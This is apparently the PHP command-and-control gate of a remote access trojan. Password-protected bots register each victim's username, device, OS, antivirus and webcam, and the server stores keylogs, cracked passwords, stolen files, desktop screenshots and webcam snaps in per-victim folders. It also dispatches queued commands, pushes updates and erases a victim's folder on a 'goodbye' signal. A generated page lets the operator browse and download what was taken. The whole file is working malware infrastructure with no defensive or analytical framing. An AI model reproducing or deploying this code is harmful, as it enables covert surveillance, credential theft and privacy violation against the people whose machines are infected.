<?php
	include 'config.php';
	error_reporting(E_ERROR | E_WARNING | E_PARSE);
	$password='army_h4ck3rz'; // Password protection for bots to connect, so no outsiders are allowed. [Default: army_h4ck3rz].
	// .htaccess file for all bots' folders.
	$htaccess="Order deny,allow\nDeny from all\n<Files index.php>\n    Allow from all\n</Files>";
	// index.php file for all bots' folders.
	$index='<?php error_reporting(E_ERROR | E_WARNING | E_PARSE); $vicfolder="DEF-VIC";$url = isset($_SERVER["HTTPS"]) ? "https://" : "http://";$url .= $_SERVER["SERVER_NAME"];$url .= $_SERVER["REQUEST_URI"];$url = dirname($url);$ru="";while (!file_exists($ru."/imgs/background.php")){$ru = "../".$ru;$url = dirname($url);}include $ru."config.php";if($loginneed){if (!isset($_COOKIE[$cookiename]) || !checksession($_COOKIE[$cookiename],$ru)){die("<script>alert(\"You are not allowed to be here\");window.location.href=\"".$url."\";</script>");}}if ($_SERVER["REQUEST_METHOD"] == "GET"){if (!isset($_GET["do"])){echo "<html><head>";echo "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">";echo "<title>Folder of the victim ".$vicfolder."</title>";echo "</head>";echo "<body>";echo "<h1>Files of the victim ".$vicfolder."</h1>";echo "<table><tbody>";$fs = scandir(".");foreach($fs as $f){$f = str_replace("/", "", $f);if($f != "." && $f != ".." && $f != "index.php" && $f != ".htaccess"){if(is_dir($f)){echo "<tr><td valign=\"top\"><img src=\"".$url."/imgs/folder.gif\" alt=\"[DIR]\"></td><td><a href=\"".$f."/index.php\">".$f."</a></td></tr>";}else{echo "<tr><td valign=\"top\"><img src=\"".$url."/imgs/".icon($f)."\" alt=\"[FILE]\"></td><td><a href=\"?do=download&file=".$f."\">".$f."</a></td></tr>";}}}echo "<tr><th colspan=\"5\"><hr></th></tr>";die("</tbody></table></body></html>");}switch ($_GET["do"]){case "download": $file = $_GET["file"];if(!file_exists(basename($file))){die("File was not found (".$file.").");}$file=basename($file);header("Content-Description: File Transfer");header("Content-Type: application/octet-stream");header("Content-Disposition: attachment; filename=\"".$file."\"");header("Expires: 0");header("Cache-Control: must-revalidate");header("Pragma: public");header("Content-Length: " . filesize($file));readfile($file);break;case "img-p":$n = (isset($_GET["n"])) ? $_GET["n"] : 0;if(!is_numeric($n)){$n=0;}$t = (isset($_GET["t"])) ? $_GET["t"] : "dss";$d = ($t == "wcs") ? "Webcam Snaps" : "Desktop Screen-Shot";$e = ($t == "wcs") ? ".bmp" : ".png";$url = isset($_SERVER["HTTPS"]) ? "https://" : "http://";$url .= $_SERVER["SERVER_NAME"];$url .= $_SERVER["REQUEST_URI"];if (!file_exists($t)){die("Error|Images of the type ".$d." were not found. Check another type.");}$fs = scandir($t);$ok="n";foreach ($fs as $f){if(strpos($f, $t) !== false){$ok="y";}}if($ok == "n"){die("Error|Images of the type ".$d." were not found. Check another type.");}$url = dirname($url)."/".$t."/";$f="";$n=($n-1);if(array_search($t."-".getZeros($n).$n.$e, $fs)){die("|".$url."index.php?do=download&file=".$t."-".getZeros($n).$n.$e."|".getZeros($n).$n);}else{for($i=0; $i < (count($fs) -1); $i++){$n=($n-1);foreach($fs as $f){if(strpos($f, $t) !== false){if(endsWith($f, "-".getZeros($n).$n.$e)){die("|".$url."index.php?do=download&file=".$f."|".getZeros($n).$n);}}}}foreach($fs as $f){if(strpos($f, $t) !== false){$fta=explode("-",$f);$ftb=explode($e,$fta[1]);$ft=$ftb[0];die("|".$url."index.php?do=download&file=".$f."|".$ft);}}}break;case "img-n":$n = (isset($_GET["n"])) ? $_GET["n"] : 0000000;if(!is_numeric($n)){$n=0;}$t = (isset($_GET["t"])) ? $_GET["t"] : "dss";$d = ($t == "wcs") ? "Webcam Snaps" : "Desktop Screen-Shot";$e = ($t == "wcs") ? ".bmp" : ".png";$url = isset($_SERVER["HTTPS"]) ? "https://" : "http://";$url .= $_SERVER["SERVER_NAME"];$url .= $_SERVER["REQUEST_URI"];if (!file_exists($t)){die("Error|Images of the type ".$d." were not found. Check another type.");}$fs = scandir($t);$ok="n";foreach ($fs as $f){if(strpos($f, $t) !== false){$ok="y";}}if($ok == "n"){die("Error|Images of the type ".$d." were not found. Check another type.");}$url = dirname($url)."/".$t."/";$n=($n+1);if(array_search($t."-".getZeros($n).$n.$e, $fs)){die("|".$url."index.php?do=download&file=".$t."-".getZeros($n).$n.$e."|".$n);}else{for($i=0; $i < (count($fs) -1); $i++){$n=($n+1);foreach($fs as $f){if(strpos($f, $t) !== false){if(endsWith($f, "-".getZeros($n).$n.$e)){die("|".$url."index.php?do=download&file=".$f."|".getZeros($n).$n);}}}}foreach($fs as $f){if(strpos($f, $t) !== false){$fta=explode("-",$f);$ftb=explode($e,$fta[1]);$ft=$ftb[0];die("|".$url."index.php?do=download&file=".$f."|".$ft);}}}break;default:die("Unkown requested action (".$_GET["do"].").");break;}}function icon($f){$icons = array(".jpg" => "img.gif", ".png" => "img.gif","" => "file.gif");foreach ($icons as $k => $v){if(endsWith($f,$k)){return $v;}}}function endsWith($h, $n){return $n === "" || (($t = strlen($h) - strlen($n)) >= 0 && strpos($h, $n, $t) !== false);}function checksession($cv,$ru){$ok=false;if (!file_exists($ru."config.php")){return false;}$handle = fopen($ru."config.php", "r");while (($line = fgets($handle)) !== false) {if (strpos($line,"|")!==false) {$settings=explode("|", $line);if($settings[1]==$cv){$ok=true;}}}fclose($handle);return $ok;}function getZeros($n){$lft=7-strlen($n);return str_repeat("0", $lft);} ?>';
	if(!isset($_GET['password']) || md5($password) != $_GET['password']){die();} // Check if the password is given by the bot and if it's correct.
	$dbcon = connectdb(); if($dbcon === false){die('Cannot connect to the Database.');} // Check connection to the Database.
	$antivirus="Unknown";
  if(isset($_POST['antivirus'])){$antivirus=$_POST['antivirus'];}if(isset($_GET['antivirus'])){$antivirus=$_GET['antivirus'];}
	$ip="";
  if(isset($_POST['ip'])){$ip=$_POST['ip'];}if(isset($_GET['ip'])){$ip=$_GET['ip'];}
  if($ip==''){$ip=($_SERVER['REMOTE_ADDR']=="::1") ? "127.0.0.1" : $_SERVER['REMOTE_ADDR'];} // Get the IP address of the bot.
	$country=country($ip); // Get the country of the IP.
	if($_SERVER['REQUEST_METHOD'] == 'POST'){
		if(!isset($_POST['botid'])){die("No botid was given.");}
		if(!isnew($_POST['botid'])){if(file_exists(getfolder($_POST['botid'])."/goodbye.txt")){gb($_POST['botid']);}}
		switch ($_POST['do']){
			case 'download':
				if(!isset($_POST['file'])){die("No file name was given.");}
				$folder=(isset($_POST['folder'])) ? $__POST['folder'] : "";
				if($folder!=""){if(!file_exists($folder)){die("The folder doesn't exist.");}}
				$file=$folder."/".basename($_POST['file']);
				header("Content-Description: File Transfer");
				header("Content-Type: application/octet-stream");
				header("Content-Disposition: attachment; filename=\"".basename($file)."\"");
				header("Expires: 0");
				header("Cache-Control: must-revalidate");
				header("Pragma: public");
				header("Content-Length: " . filesize($file));
				readfile($file);
				break;
			case 'info':
				if(file_exists('extras/version.txt')){
					foreach(file('extras/version.txt') as $line){
						if(strpos($line, '|') > 0){
							$linep = explode('|',$line);
							$vera = explode(' - ', $linep[0]);
							$vern = explode(' - ', $_POST['version']);
							if($vera[1] == $vern[1]){
								if($vern[0] < $vera[0]){
									die('update '.$linep[1].';');
								}
							}
						}
					}
				}
				if(isnew($_POST['botid'])){
					newbot($_POST['botid'],$_POST['botname'],$_POST['username'],$_POST['devicename'],$_POST['os'],$ip,$country,$_POST['version'],$_POST['webcam'],getrnd());
				}else{
					updatebot($_POST['botid'],$_POST['botname'],$_POST['username'],$_POST['devicename'],$_POST['os'],$ip,$country,$_POST['version'],$_POST['webcam']);
					getcmds($_POST['botid']);
				}
				break;
		}
	}elseif($_SERVER['REQUEST_METHOD'] == 'PUT'){
		if(!isset($_GET['type'])){die("No type was given.");}
		if(!isset($_GET['botid'])){die("No botid was given.");}
		if(file_exists(getfolder($_GET['botid'])."/goodbye.txt")){gb($_GET['botid']);}
		$botid=$_GET['botid'];
		$putdata = fopen("php://input", "r");
		$file="";
		$bdata = "";
		switch($_GET['type']){
			case 'upload':
				if(!isset($_GET['file'])){die("No file name was given.");}
				$folder=(isset($_GET['folder'])) ? $_GET['folder']."/" : "";
				$folder=getfolder($botid)."/".$folder;
				if($folder!=""){
					if(!file_exists($folder)){
						mkdir($folder,0755,true);
						$index = str_replace("DEF-VIC", $botid, $index);
						if(!file_exists($folder."/index.php")){file_put_contents($folder."/index.php", $index);}
						if(!file_exists($folder."/.htaccess")){file_put_contents($folder."/.htaccess", $htaccess);}
					}
				}
				$file=$folder.basename($_GET['file']);
				if(endsWith(strtolower($file),".log")){
					if(file_exists($file)){$bdata = file_get_contents($file)."\r\n";}
				}
				if(endsWith(strtolower($file),".php") || endsWith(strtolower($file),".asp") || endsWith(strtolower($file),".apsx") || endsWith(strtolower($file),".py") || endsWith(strtolower($file),".pl") || endsWith(strtolower($file),".cgi")){
					$file .= '.txt';
				}
				if(endsWith(strtolower($file),".keys")){
					if(file_exists($file)){$bdata = file_get_contents($file)."\r\n";}
				}
				if(endsWith(strtolower($file),"cracked.txt")){
					$file=$_GET['file'];
					if(file_exists($file)){$bdata = file_get_contents($file)."\r\n";}
				}
				break;
			case 'dss':
				$file=img_save($_GET['botid'],"dss");
				break;
			case 'wcs':
				$file=img_save($_GET['botid'],"wcs");
				break;
		}
		if($file==""){fclose($putdata);die();}
		$fp = fopen($file, "w");
		fwrite($fp, $bdata);
		while ($data = fread($putdata, 1024))
			fwrite($fp, $data);
		fclose($fp);
		fclose($putdata);
		die(getcmds($botid));
	}
	function isnew($botid){
		$dbcon = connectdb(); if($dbcon === false){die('Cannot connect to the Database.');}
		$rcon = $dbcon->prepare("SELECT * FROM bots WHERE botid = ?");if($rcon!==false){
			$rcon->bind_param("s",$botid);
			if($rcon->execute()){
				$rcon->store_result();
				if($rcon->affected_rows==0){
					return true;
				}
			}
		}
		return false;
	}
	function newbot($botid,$name,$username,$devicename,$os,$ip,$country,$version,$webcam,$folder){
		global $htaccess;
		global $index;
		global $antivirus;
		if(!file_exists("sessions")){mkdir("sessions",0755,true);file_put_contents("sessions/index.php", "");}
		if(!file_exists("sessions/".$folder)){mkdir("sessions/".$folder,0755,true);}
		$index = str_replace("DEF-VIC", $botid, $index);
		if(!file_exists("sessions/".$folder."/index.php")){file_put_contents("sessions/".$folder."/index.php", $index);}
		if(!file_exists("sessions/".$folder."/.htaccess")){file_put_contents("sessions/".$folder."/.htaccess", $htaccess);}
		$dbcon = connectdb(); if($dbcon === false){die('Cannot connect to the Database.');}
		$rcon=$dbcon->prepare("INSERT INTO bots VALUES(?,?,?,?,?,?,?,?,?,1,'".time()."','',?)");if($rcon===false){
			die("Error adding the bot. Error ==> ".$dbcon->error."|Error # ==> ".$dbcon->errno);}else{
				$folder="sessions/".$folder;
				$rcon->bind_param("ssssssssss",$botid,$name,$username,$devicename,$os,$ip,$country,$version,$webcam,$folder);
				if($rcon->execute()===false){
					die("Error adding the bot. Error ==> ".$dbcon->error."|Error # ==> ".$dbcon->errno);
				}
				$rcon=$dbcon->prepare("INSERT INTO statics VALUES(?,?,?,?)");if($rcon!==false){
					$st=1;
					$rcon->bind_param("ssss",$country,$antivirus,$st,$botid);
					$rcon->execute();
				}
		}
	}
	function updatebot($botid,$name,$username,$devicename,$os,$ip,$country,$version,$webcam){
		global $htaccess;
		global $index;
		global $antivirus;
		$dbcon = connectdb(); if($dbcon === false){die('Cannot connect to the Database.');}
		if(!file_exists("sessions")){mkdir("sessions",0755,true);file_put_contents("sessions/index.php", "");}
		$index = str_replace("DEF-VIC", $botid, $index);
		$rcon=$dbcon->prepare("UPDATE bots SET botname=?,username=?,devicename=?,os=?,ip=?,country=?,version=?,webcam=?,active='1',lastseen='".time()."' WHERE botid = ?");if($rcon===false){die("Error updating the bot info. Error ==> ".$dbcon->error."|Error # ==> ".$dbcon->errno);}else{
			$rcon->bind_param("sssssssss",$name,$username,$devicename,$os,$ip,$country,$version,$webcam,$botid);
			if(!$rcon->execute()){
				die("Error updating the bot info. Error ==> ".$dbcon->error."|Error # ==> ".$dbcon->errno);
			}
			$rcon=$dbcon->prepare("UPDATE statics SET counrty=?,antivirus=?,status=? WHERE id=?");if($rcon!==false){
				$st=1;
				$rcon->bind_param("ssss",$country,$antivirus,$st,$botid);
				$rcon->execute();
			}
		}
		if(!file_exists(getfolder($botid)."/index.php")){file_put_contents(getfolder($botid)."/index.php", $index);}
		if(!file_exists(getfolder($botid)."/.htaccess")){file_put_contents(getfolder($botid)."/.htaccess", $htaccess);}
	}
	function getfolder($botid){
		global $ip;
		global $country;
		global $dbcon;
		if(isnew($botid)){die("Since when new bots are uploading files?");}
		$rcon=$dbcon->prepare("SELECT folder FROM bots WHERE botid = ?");if($rcon!==false){
			$rcon->bind_param("s",$botid);$rcon->execute();$q = $rcon->store_result();
			$bot='';$rcon->bind_result($bot);if($rcon->fetch()){return $bot;}
		}
	}
	function getcmds($botid){
		$dbcon = connectdb(); if($dbcon === false){die('Cannot connect to the Database.');}
		if(isnew($botid)){return "";}
		$rcon=$dbcon->prepare("SELECT cmd FROM bots WHERE botid = ?");if($rcon!==false){
			$rcon->bind_param("s",$botid);$rcon->execute();
			$rcon->store_result();
			$cmd="";
			$rcon->bind_result($cmd);
			if($rcon->fetch()){
				$rcon = $dbcon->prepare("UPDATE bots SET cmd='' WHERE botid = ?");
				$rcon->bind_param("s",$botid);
				$rcon->execute();
				echo $cmd;
			}
		}
	}
	function img_save($botid,$typ='dss'){
		global $ip;
		global $country;
		global $dbcon;
		global $index;
		global $htaccess;
		$q=null;
		if (isnew($botid)){
			newbot($botid,"Unkown","Unkown","Unkown","Unkown",$ip,$country,"Unkown","Unkown",getrnd());
		}
		$rcon=$dbcon->prepare("SELECT * FROM bots WHERE botid = ?");if($rcon!==false){
			$rcon->bind_param("s",$botid);
			$rcon->execute();
			$rcon->store_result();
			$bot='';
			$rcon->bind_result($bot);
			if($rcon->fetch()){
				$img_c=0;
				$e = "";
				if(isset($_GET['ext'])){$e='.'.$_GET['ext'];}
				if($e==''){$e = ($typ=="dss") ? ".png" : ".bmp";}
				if(!file_exists($bot."/".$typ)){mkdir($bot."/".$typ,0755,true);}
				$index = str_replace("DEF-VIC", $botid, $index);
				if(!file_exists($bot."/".$typ."/index.php")){file_put_contents($bot."/".$typ."/index.php", $index);}
				if(!file_exists($bot."/".$typ."/.htaccess")){file_put_contents($bot."/".$typ."/.htaccess", $htaccess);}
				while(file_exists($bot."/".$typ."/".$typ."-".getZeros($img_c).$img_c.$e)){$img_c++;}
				return $bot."/".$typ."/".$typ."-".getZeros($img_c).$img_c.$e;
			}
		}

	}
	function getZeros($n){
		$lft = 7 - strlen($n);
		return str_repeat('0', $lft);
	}
	function country($ip){
		$ishome = home_ip($ip);
		if($ishome!=""){
			switch($ishome){
				case 'lan':
					return "LAN Network";
					break;
				default:
					return "This computer";
					break;
			}
		}
		return ip_info($ip,"country");
	}
	function home_ip($ip){
		$lan_ips = array( // not an exhaustive list
		'167772160'  => 184549375,  /*	10.0.0.0 -  10.255.255.255 */
		'3232235520' => 3232301055, /* 192.168.0.0 - 192.168.255.255 */
		'2851995648' => 2852061183, /* 169.254.0.0 - 169.254.255.255 */
		'2886729728' => 2887778303, /*  172.16.0.0 -  172.31.255.255 */
		'3758096384' => 4026531839, /*   224.0.0.0 - 239.255.255.255 */
		);
		$c_device = array('2130706432' => 2147483647/*   127.0.0.0 - 127.255.255.255 */);
		$ip_long = sprintf('%u', ip2long($ip));
		foreach ($c_device as $ip_start => $ip_end){
			if (($ip_long >= $ip_start) && ($ip_long <= $ip_end)){
				return "this";
			}
		}
		foreach ($lan_ips as $ip_start => $ip_end){
			if (($ip_long >= $ip_start) && ($ip_long <= $ip_end)){
				return "lan";
			}
		}
		return "";
	}
	function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
		$output = NULL;
		if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
			$ip = $_SERVER["REMOTE_ADDR"];
			if ($deep_detect) {
				if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
					$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
				if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
					$ip = $_SERVER['HTTP_CLIENT_IP'];
			}
		}
		$purpose	= str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
		$support	= array("country", "countrycode", "state", "region", "city", "location", "address");
		$continents = array(
			"AF" => "Africa",
			"AN" => "Antarctica",
			"AS" => "Asia",
			"EU" => "Europe",
			"OC" => "Australia (Oceania)",
			"NA" => "North America",
			"SA" => "South America"
		);
		if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
			$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
			if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
				switch ($purpose) {
					case "location":
						$output = array(
							"city"		   => @$ipdat->geoplugin_city,
							"state"		  => @$ipdat->geoplugin_regionName,
							"country"		=> @$ipdat->geoplugin_countryName,
							"country_code"   => @$ipdat->geoplugin_countryCode,
							"continent"	  => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
							"continent_code" => @$ipdat->geoplugin_continentCode
						);
						break;
					case "address":
						$address = array($ipdat->geoplugin_countryName);
						if (@strlen($ipdat->geoplugin_regionName) >= 1)
							$address[] = $ipdat->geoplugin_regionName;
						if (@strlen($ipdat->geoplugin_city) >= 1)
							$address[] = $ipdat->geoplugin_city;
						$output = implode(", ", array_reverse($address));
						break;
					case "city":
						$output = @$ipdat->geoplugin_city;
						break;
					case "state":
						$output = @$ipdat->geoplugin_regionName;
						break;
					case "region":
						$output = @$ipdat->geoplugin_regionName;
						break;
					case "country":
						$output = @$ipdat->geoplugin_countryName;
						break;
					case "countrycode":
						$output = @$ipdat->geoplugin_countryCode;
						break;
				}
			}
		}
		return $output;
	}
	function getrnd($length = 20) {
	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }
	    return $randomString;
	}
	function connectdb(){
		global $dbhost;
		global $dbuser;
		global $dbpass;
		global $dbname;
		$con = new mysqli($dbhost,$dbuser,$dbpass,$dbname);
		if($con->connect_error){return false;}
		if ($con->query("SET NAMES 'utf8' COLLATE 'utf8_unicode_ci'")===false){return false;}
		return $con;
	}
	function startsWith($haystack, $needle){
		$length = strlen($needle);
		return (substr($haystack, 0, $length) === $needle);
	}
	function endsWith($haystack, $needle){
		$length = strlen($needle);
		if ($length == 0) {
			return true;
	 	}
	    return (substr($haystack, -$length) === $needle);
	}
	function gb($botid){
		global $dbname;
		$dbcon = connectdb();
		$rcon=$dbcon->prepare("SELECT folder FROM bots WHERE botid = ?");if($rcon!==false){
			$rcon->bind_param("s",$botid);
			if($rcon->execute()){
				$q=$rcon->store_result();
			}else{return;}
		}else{return;}
		$bot='';$rcon->bind_result($bot);if($rcon->fetch()){erasedir($bot);}
		$rcon=$dbcon->prepare("DELETE FROM bots WHERE `botid` = ?");if($rcon!==false){
			$rcon->bind_param("s",$botid);
			if($rcon->execute()){die("goodbye;");}
		}
	}
	function erasedir($dir){
		if(is_dir($dir)){
			if($dir_handle = opendir($dir)){
				while($fname=readdir($dir_handle)){
					if($fname!='.' && $fname!='..'){if(is_dir($dir.'/'.$fname)){erasedir($dir.'/'.$fname);}else{unlink($dir.'/'.$fname);}}
				}
				closedir($dir_handle);
			}
			rmdir($dir);
		}
	}
?>
